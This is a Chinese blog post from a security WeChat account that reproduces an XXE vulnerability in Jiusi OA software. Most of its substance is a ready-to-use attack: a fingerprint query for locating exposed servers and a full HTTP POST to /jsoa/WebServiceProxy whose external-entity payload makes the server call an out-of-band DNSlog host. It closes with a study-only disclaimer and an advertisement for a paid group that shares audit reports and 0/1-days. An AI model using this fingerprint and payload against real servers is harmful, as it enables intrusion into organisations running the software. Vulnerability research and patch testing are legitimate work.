> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkzNDI5NjEzMQ==&mid=2247484832&idx=1&sn=9a171d184af60ecce4816d36d84c0352

#  【漏洞复现】九思oa-XXE  
原创 跟着斯叔唠安全  跟着斯叔唠安全   2025-06-16 23:01  
  
免责声明  
：  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
1  
  
Start  
  
指纹  

```
body=&#34;/jsoa/login.jsp&#34;
```

  
  
2  
  
Action  

```
POST /jsoa/WebServiceProxy HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 85


<!DOCTYPE root [ <!ENTITY % remote SYSTEM &#34;http://xxx.dnslog.cn&#34;>
 %remote;]>
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/pKCicPnn24UZKn5F9wXcZVHw4kykeFZEibeRn89piaiaRhTwN3Sia7DQx74CdLpqxMuNu5D3QadpnA1nrZYXHPeWJWA/640?wx_fmt=png&from=appmsg "")  
  
代码审计报告已上传至纷传圈子中，需要的师傅可以自取哈  
  
  
3  
  
End  
  
🚀 **新圈子上线 | 高质量安全内容持续更新中！**  
  
我最近在纷传上建立了一个全新的安全技术圈子，主要聚焦于 **WEB安全、APP安全、代码审计、漏洞分享**  
 等核心方向。目前圈子刚刚建立，内容还不算多，但会**持续高频更新**  
，只分享真正有价值、有深度的干货文章。  
  
📚 圈子中包含：  
- 高质量原创或精选的安全技术文章  
  
- 公众号历史付费内容免费查看（如：小程序RPC、APP抓包解决方案）  
  
- 一些只在圈子内分享的独家思路和实战经验  
  
- 不定期分享0/1day  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pKCicPnn24UaQw8cfe5zo87XFXicicayuia9gvdmBnX6lOnSygn4NFJlzqeyxyes0uIYicDwGwh3rbAYicdwYFhK3Ang/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
